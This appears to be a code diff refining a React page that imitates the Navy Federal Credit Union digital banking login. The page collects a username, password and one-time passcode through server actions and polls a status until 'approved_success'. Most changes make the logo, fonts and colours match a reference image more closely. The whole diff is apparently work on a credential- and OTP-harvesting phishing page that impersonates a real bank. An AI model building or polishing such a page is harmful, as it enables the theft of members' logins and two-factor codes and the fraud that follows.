@@ -1,12 +1,13 @@
 'use client'
 
 import { useEffect, useState } from 'react'
+
 import {
   startChallenge,
   submitUsername,
   submitOtp,
   getStatus,
-} from '@/app/actions'
+} from './actions'
 
 type Step =
   | 'credentials'
@@ -125,21 +126,28 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Navigation Header */}
+      {/* Navigation Header matching image 1 perfectly */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
-          <button style={styles.iconBtn} aria-label="Menu">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <line x1="3" y1="12" x2="21" y2="12" />
+          <button style={styles.iconBtn} aria-label="Menu" type="button">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
               <line x1="3" y1="6" x2="21" y2="6" />
+              <line x1="3" y1="12" x2="21" y2="12" />
               <line x1="3" y1="18" x2="21" y2="18" />
             </svg>
           </button>
+          
           <div style={styles.logoGroup}>
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="2" y1="12" x2="22" y2="12" />
-              <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+            {/* Detailed Globe Grid matching target header */}
+            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2">
+              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
+              {/* Latitude lines */}
+              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
+              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
+              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
+              {/* Longitude lines */}
+              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
+              <ellipse cx="12" cy="12" rx="6" ry="10" />
             </svg>
             <span style={styles.logoText}>NAVY FEDERAL</span>
           </div>
@@ -147,14 +155,14 @@ export default function NavyFederalBanking() {
       </header>
 
       <main style={styles.main}>
-        {/* Banner Section */}
+        {/* Banner */}
         <section style={styles.banner}>
           <h1 style={styles.bannerTitle}>
             {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
           </h1>
         </section>
 
-        {/* Card Section */}
+        {/* Card Form */}
         <section style={styles.cardWrapper}>
           <div style={styles.card}>
             {step === 'approved_success' ? (
@@ -167,7 +175,7 @@ export default function NavyFederalBanking() {
             ) : (
               <>
                 <div style={styles.cardHeader}>
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
                     <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                     <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                   </svg>
@@ -202,25 +210,26 @@ export default function NavyFederalBanking() {
                             required
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
-                            style={styles.input}
+                            style={styles.inputWithEye}
                             autoComplete="current-password"
                           />
                           <button
                             type="button"
-                            onClick={() => setShowPassword(!showPassword)}
+                            onClick={() => setShowPassword((prev) => !prev)}
                             style={styles.eyeBtn}
-                            aria-label="Toggle password"
+                            aria-label={showPassword ? 'Hide password' : 'Show password'}
                           >
-                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2">
-                              {showPassword ? (
-                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" />
-                              ) : (
-                                <>
-                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
-                                  <circle cx="12" cy="12" r="3" />
-                                </>
-                              )}
-                            </svg>
+                            {showPassword ? (
+                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                                <line x1="1" y1="1" x2="23" y2="23" />
+                              </svg>
+                            ) : (
+                              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                <circle cx="12" cy="12" r="3" />
+                              </svg>
+                            )}
                           </button>
                         </div>
                       </div>
@@ -300,31 +309,37 @@ export default function NavyFederalBanking() {
           </div>
         </section>
 
-        {/* Member Callout Section */}
+        {/* Member Callout */}
         <section style={styles.whiteSection}>
           <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
           <p style={styles.sectionDesc}>
             Join now and enjoy the support and great service of a credit union that puts your needs first.
           </p>
           <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-            <button style={styles.btnPrimary}>Become a Member</button>
-            <button style={styles.btnBlue}>Learn More</button>
+            <button style={styles.btnPrimary} type="button">Become a Member</button>
+            <button style={styles.btnBlue} type="button">Learn More</button>
           </div>
         </section>
 
-        {/* Footer Section */}
+        {/* Footer */}
         <footer style={styles.footer}>
           <div style={styles.logoGroupFooter}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="2" y1="12" x2="22" y2="12" />
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="1.2">
+              <circle cx="12" cy="12" r="10" strokeWidth="1.5" />
+              <line x1="2" y1="12" x2="22" y2="12" strokeWidth="1.5" />
+              <line x1="3.5" y1="7.5" x2="20.5" y2="7.5" />
+              <line x1="3.5" y1="16.5" x2="20.5" y2="16.5" />
+              <line x1="12" y1="2" x2="12" y2="22" strokeWidth="1.5" />
+              <ellipse cx="12" cy="12" rx="6" ry="10" />
             </svg>
             <div>
-              <div style={{ fontWeight: 800, fontSize: 16, color: '#10305a', fontStyle: 'italic' }}>NAVY FEDERAL</div>
+              <div style={{ fontWeight: 800, fontSize: 15, color: '#10305a', fontStyle: 'normal', letterSpacing: '0.5px' }}>NAVY FEDERAL</div>
               <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
             </div>
           </div>
-          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>© 2026 Navy Federal Credit Union. All rights reserved.</p>
+          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>
+            © 2026 Navy Federal Credit Union. All rights reserved.
+          </p>
         </footer>
       </main>
     </div>
@@ -335,39 +350,41 @@ const styles: { [key: string]: React.CSSProperties } = {
   container: {
     minHeight: '100vh',
     backgroundColor: '#143260',
-    fontFamily: 'system-ui, -apple-system, sans-serif',
+    fontFamily: 'Arial, Helvetica, sans-serif',
     color: '#2d3748',
     margin: 0,
   },
   header: {
-    backgroundColor: '#104780',
+    backgroundColor: '#0d3e75',
     color: '#ffffff',
-    padding: '12px 16px',
-    borderBottom: '1px solid #0c3663',
+    padding: '14px 16px',
+    borderBottom: '1px solid #092c54',
   },
   headerLeft: {
     display: 'flex',
     alignItems: 'center',
-    gap: 12,
+    gap: 16,
   },
   iconBtn: {
     background: 'none',
     border: 'none',
     color: '#fff',
     cursor: 'pointer',
-    padding: 4,
+    padding: 2,
     display: 'flex',
+    alignItems: 'center',
   },
   logoGroup: {
     display: 'flex',
     alignItems: 'center',
-    gap: 8,
+    gap: 10,
   },
   logoText: {
     fontWeight: 800,
-    fontSize: 20,
-    fontStyle: 'italic',
-    letterSpacing: '-0.5px',
+    fontSize: 22,
+    fontStyle: 'normal', // Straight (non-italic) font to match image 1
+    letterSpacing: '0.5px',
+    fontFamily: 'Arial Black, Arial, sans-serif',
   },
   main: {
     maxWidth: 440,
@@ -446,14 +463,26 @@ const styles: { [key: string]: React.CSSProperties } = {
     boxSizing: 'border-box',
     outline: 'none',
   },
+  inputWithEye: {
+    width: '100%',
+    padding: '10px 40px 10px 12px',
+    backgroundColor: '#ffffff',
+    border: '1px solid #a0aec0',
+    borderRadius: 4,
+    fontSize: 15,
+    boxSizing: 'border-box',
+    outline: 'none',
+  },
   eyeBtn: {
     position: 'absolute',
     right: 10,
     background: 'none',
     border: 'none',
     cursor: 'pointer',
-    padding: 0,
+    padding: 4,
     display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
   },
   dottedLink: {
     fontSize: 12,
